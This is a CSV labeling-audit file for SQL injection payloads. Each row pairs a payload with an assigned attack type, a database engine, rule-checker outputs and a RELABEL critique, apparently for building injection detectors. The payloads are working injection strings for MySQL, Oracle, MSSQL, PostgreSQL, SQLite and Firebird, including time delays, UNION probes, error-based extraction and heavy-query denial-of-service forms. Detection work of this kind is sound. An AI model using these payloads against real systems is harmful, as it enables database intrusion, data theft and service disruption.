payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1'+ ( select 'jhce' where 1117 = 1117 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,21369,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1'+ ( select 'jhce' where 1117 = 1117 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'"
"1"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""lano"" = ""lano",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,21370,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""lano"" = ""lano"
1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'psdl' like 'psdl,error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,21371,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'psdl' like 'psdl
"1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""oyxk"" = ""oyxk",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,21372,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""oyxk"" = ""oyxk"
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 7711 = 7711",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,21373,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 7711 = 7711"
"-6600' ) union all select 5566,5566#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,21374,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6600' ) union all select 5566,5566#"
1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,21375,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno )
"-9721' or elt ( 9511 = 9238,9238 )",boolean_blind,generic,0.5,elt_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,21376,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-9721' or elt ( 9511 = 9238,9238 )"
"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,21377,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) )"
"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,21378,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #"
"select pg_sleep ( 5 ) and ""ilyw"" like ""ilyw",time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,21379,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"select pg_sleep ( 5 ) and ""ilyw"" like ""ilyw"
-2820' ) ) or 6679 = 8848--,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,21380,boolean_blind,generic,Pattern match: 'or 6679 = 8848' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2820' ) ) or 6679 = 8848--
"-6453"" ) ) as hehs where 9363 = 9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,21381,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6453"" ) ) as hehs where 9363 = 9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#"
"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""zwov"" = ""zwov",time_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'heavy_query' (P4) but labeled 'time_blind' (P5),heavy_query,postgresql,21382,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""zwov"" = ""zwov"
1' ) ) as oyad where 7161 = 7161 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,21383,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1' ) ) as oyad where 7161 = 7161 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
"1 ) ) as kgit where 1919 = 1919 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,21384,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) ) as kgit where 1919 = 1919 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
1 ) ) as mcyh where 1001 = 1001,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,21385,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as mcyh where 1001 = 1001
"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'usnh' like 'usnh",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,21386,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and 'usnh' like 'usnh"
"1%"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,out_of_band,oracle,0.9,dbms_utility,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,21387,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"1%"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """
"-5207 ) where 6987 = 6987 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,21388,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-5207 ) where 6987 = 6987 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"-1287"" ) as bbzg where 1475 = 1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,21389,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1287"" ) as bbzg where 1475 = 1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#"
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'fpaf' = 'fpaf",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,21390,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'fpaf' = 'fpaf"
"1"" ) ) ) and sleep ( 5 ) and ( ( ( ""bvgg"" = ""bvgg",time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,21391,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" ) ) ) and sleep ( 5 ) and ( ( ( ""bvgg"" = ""bvgg"
1 and 7533 = 7533-- spzi,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,21392,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 and 7533 = 7533-- spzi
"-1644%' or make_set ( 9354 = 9354,7185 ) and '%' = '",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,21393,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-1644%' or make_set ( 9354 = 9354,7185 ) and '%' = '"
"1 where 4331 = 4331 union all select null,null,null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,21394,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 where 4331 = 4331 union all select null,null,null,null,null,null#"
1 ) as qort where 1554 = 1554,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,21395,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as qort where 1554 = 1554
"1"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,21396,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --"
1 ) where 5418 = 5418 union all select null--,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,21397,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,1 ) where 5418 = 5418 union all select null--
1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'eocx' = 'eocx,out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,21398,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,1' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'eocx' = 'eocx
"1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,21399,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --"
